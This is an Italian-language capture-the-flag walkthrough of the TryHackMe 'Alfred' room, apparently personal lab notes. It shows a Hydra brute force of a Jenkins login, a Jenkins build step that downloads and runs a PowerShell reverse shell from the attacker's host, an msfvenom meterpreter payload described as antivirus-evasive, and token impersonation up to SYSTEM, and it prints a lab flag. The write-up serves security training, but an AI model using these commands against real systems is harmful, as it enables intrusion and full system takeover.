
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/alfred

```
nmap -sV -O -Pn -p- -v 10.10.238.227
```

```
Discovered open port 80/tcp on 10.10.238.227
Discovered open port 8080/tcp on 10.10.238.227
Discovered open port 3389/tcp on 10.10.238.227

```
Quante porte sono aperte? (solo TCP)
```
3
```
andiamo su 
```
http://10.10.238.227:8080/login
```
Intercettiamo richiesta login con burp suite

```
POST /j_acegi_security_check HTTP/1.1
Host: 10.10.238.227:8080
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://10.10.238.227:8080
Connection: keep-alive
Referer: http://10.10.238.227:8080/loginError
Cookie: JSESSIONID.71ce619e=node01bp12v77slorfba42682o818r1.node0
Upgrade-Insecure-Requests: 1

j_username=admin&j_password=12345&from=&Submit=Sign+in
```


```
hydra -s 8080 -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt 10.10.238.227 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password' -f -o login_brute_force.txt
```
Il comando che hai fornito utilizza Hydra, uno strumento di attacco per la forza bruta, per tentare di effettuare il login a un'applicazione web. Ecco una spiegazione dettagliata di ciascuna parte del comando:

- `hydra`: Questo è il comando per avviare lo strumento Hydra.
    
- `-s 8080`: Specifica la porta su cui l'applicazione web è in ascolto. In questo caso, la porta 8080.
    
- `-L /usr/share/wordlists/metasploit/unix_users.txt`: Indica il file che contiene l'elenco degli username da provare. In questo caso, si utilizza un file di wordlist che contiene nomi utente comuni.
    
- `-P /usr/share/wordlists/rockyou.txt`: Indica il file che contiene l'elenco delle password da provare. Qui si utilizza il famoso file di wordlist "rockyou.txt", che contiene molte password comuni.
    
- `10.10.238.227`: Questo è l'indirizzo IP della macchina target su cui si sta tentando di effettuare il login.
    
- `http-post-form`: Specifica che si sta tentando di effettuare un attacco su un modulo di login che utilizza il metodo HTTP POST.
    
- `'/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password'`: Questa parte definisce il formato della richiesta POST.
    
    - `/j_acegi_security_check`: È l'URL del modulo di login.
    - `j_username=^USER^`: Qui `^USER^` verrà sostituito da ciascun nome utente della lista.
    - `j_password=^PASS^`: Qui `^PASS^` verrà sostituito da ciascuna password della lista.
    - `from=&Submit=Sign+in`: Questi sono altri parametri del modulo che vengono inviati con la richiesta.
    - `Invalid username or password`: Questo è il messaggio di errore che Hydra cercherà nella risposta per determinare se il login è fallito.
- `-f`: Questo flag indica a Hydra di fermarsi al primo login riuscito. Se non è presente, Hydra continuerà a provare tutte le combinazioni.
    
- `-o login_brute_force.txt`: Specifica il file di output in cui verranno salvati i risultati dell'attacco, inclusi eventuali login riusciti.
    

In sintesi, questo comando tenta di effettuare un attacco di forza bruta su un modulo di login web, utilizzando una lista di nomi utente e una lista di password, e salva i risultati in un file.

```
└─$ hydra -s 8080 -L us.txt -P pw.txt 10.10.238.227 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password' -f -o login_brute_force.txt
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-31 04:13:05
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:4/p:6), ~2 tries per task
[DATA] attacking http-post-form://10.10.238.227:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password
[8080][http-post-form] host: 10.10.238.227   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-31 04:13:25

```

scarichiamo
```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```
creiamo server per trasferire script
```
python3 -m http.server 8081
```
mettiamo in ascolto altro terminale in attesa che lo script trasferito venga eseguito
```
nc -nvlp 1234
```
creiamo il comando per caricare ed eseguire lo script dal server Jenkins 
```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```
quindi lo inseriamo in project>general salviamo
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.116.149:8081/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.116.149 -Port 1234
```
ed infine facendo Build Now otteniamo la reverse shell

andiamo in
```
cd c:\Users\bruce\Desktop
```

```
type user.txt
```
flag
```
79007a09481963edf2e1321abd9ae2a0
```

Per semplificare l'escalation dei privilegi, passiamo a una shell meterpreter utilizzando la seguente procedura.

Utilizzare msfvenom per creare una shell inversa meterpreter di Windows utilizzando il seguente payload:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`  

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.116.149 LPORT=1244 -f exe -o shell-name.exe
```
Qual è la dimensione finale del payload exe che hai generato?
```
Final size of exe file: 73802 bytes

```

```
python3 -m http.server 8000
```

Questo payload genera un payload meterpreter TCP inverso x86-64 codificato. I payload sono solitamente codificati per garantire che vengano trasmessi correttamente e anche per eludere i prodotti antivirus. Un prodotto antivirus potrebbe non riconoscere il payload e non contrassegnarlo come dannoso.

Dopo aver creato questo payload, scaricalo sulla macchina utilizzando lo stesso metodo del passaggio precedente:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.116.149:8000/shell-name.exe','shell-name.exe')"
```

Prima di eseguire questo programma, assicurati che il gestore sia impostato in Metasploit :

`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`  

```
use exploit/multi/handler
```
```
set PAYLOAD windows/meterpreter/reverse_tcp
```
```
set LHOST 10.11.116.149
```
```
set LPORT 1244
```
```
run
```


﻿Questo passaggio utilizza il gestore Metasploit per ricevere la connessione in arrivo dalla tua reverse shell. Una volta che è in esecuzione, inserisci questo comando per avviare la reverse shell

`Start-Process "shell-name.exe"`

inseriamo questo comando e rifacciamo BuildNow
```
shell-name.exe
```
Questo dovrebbe generare un revshell meterpreter!

Ora che abbiamo l'accesso iniziale, utilizziamo la rappresentazione tramite token per ottenere l'accesso al sistema.

**Windows usa i token** per garantire che gli account abbiano i privilegi giusti per eseguire determinate azioni. I token di account vengono assegnati a un account quando gli utenti effettuano l'accesso o vengono autenticati. Ciò avviene solitamente tramite LSASS.exe (pensate a questo come a un processo di autenticazione).

Questo token di accesso è composto da:

- SID utente (identificatore di sicurezza)
- SID di gruppo
- Privilegi

Tra le altre cose. Informazioni più dettagliate possono essere trovate [qui](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) .

Esistono due tipi di token di accesso:

- Token di accesso primario: quelli associati a un account utente che vengono generati all'accesso
- Token di impersonificazione: consentono a un particolare processo (o thread in un processo) di ottenere l'accesso alle risorse utilizzando il token di un altro processo (utente/client)

Per un token di impersonificazione, ci sono diversi livelli:

- SecurityAnonymous: l'utente/client corrente non può impersonare un altro utente/client
- SecurityIdentification: l'utente/client corrente può ottenere l'identità e i privilegi di un client ma non può impersonarlo
- SecurityImpersonation: l'utente/client corrente può impersonare il contesto di sicurezza del client sul sistema locale
- SecurityDelegation: l'utente/client corrente può impersonare il contesto di sicurezza del client su un sistema remoto

Dove il contesto di sicurezza è una struttura dati che contiene le informazioni di sicurezza rilevanti degli utenti.

I privilegi di un account (che vengono assegnati all'account al momento della creazione o ereditati da un gruppo) consentono a un utente di eseguire azioni specifiche. Ecco i privilegi più comunemente abusati:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

[Qui](https://www.exploit-db.com/papers/42556) puoi leggere altro .

Visualizza tutti i privilegi usando whoami /priv
```
shell 
```

```
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

```

Puoi vedere che sono abilitati due privilegi (SeDebugPrivilege, SeImpersonatePrivilege). Usiamo il modulo in incognito che ci consentirà di sfruttare questa vulnerabilità.

Inserisci: _load incognito_ per caricare il modulo incognito in Metasploit. Nota che potresti dover usare il comando _use incognito_ se il comando precedente non funziona. Inoltre, assicurati che Metasploit sia aggiornato.

```
load incognito
```

```
use incognito
```

Per controllare quali token sono disponibili, inserisci _list_tokens -g_ . Possiamo vedere che il token _BUILTIN\Administrators_ è disponibile.

Utilizzare il  comando _impersonate_token "BUILTIN\Administrators"_ per impersonare il token degli amministratori. Qual è l'output quando si esegue il comando _getuid_ ?

```
list_tokens -g
```

```
Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication

```

```
impersonate_token "BUILTIN\Administrators"
```
```
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

```
Qual è l'output quando si esegue il comando _getuid_ ?
```
getuid
```
```
Server username: NT AUTHORITY\SYSTEM
```

Anche se si dispone di un token con privilegi più elevati, è possibile che non si disponga delle autorizzazioni di un utente privilegiato (ciò è dovuto al modo in cui Windows gestisce le autorizzazioni: utilizza il token primario del processo e non il token impersonato per determinare cosa il processo può o non può fare).

Assicurati di migrare a un processo con permessi corretti (la risposta alla domanda precedente). Il processo più sicuro da scegliere è il processo services.exe. Per prima cosa, usa il comando _ps_ per visualizzare i processi e trovare il PID del processo services.exe. Migra a questo processo usando il comando _migrate PID-OF-PROCESS_

```
ps
```
668   580   services.exe  
```
migrate 668
```

Leggere il file root.txt che si trova in `C:\Windows\System32\config`
```
cat C:/Windows/System32/config/root.txt
```
```
dffxxxxxxxxxxxxxxxxxxxxxx
```
